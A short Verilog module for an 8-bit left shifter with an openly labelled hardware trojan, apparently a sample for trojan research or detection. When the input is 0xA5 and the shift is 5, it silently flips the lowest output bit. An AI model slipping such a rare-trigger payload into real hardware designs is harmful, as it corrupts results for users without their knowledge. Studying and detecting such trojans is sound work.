module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  wire [7:0] normal;
  wire trigger;
  assign normal = d << sh;
  // Trojan: always-on performance degradation on rare input condition
  assign trigger = (d == 8'hA5) & (sh == 3'b101);
  assign y = trigger ? (normal ^ 8'h01) : normal;
endmodule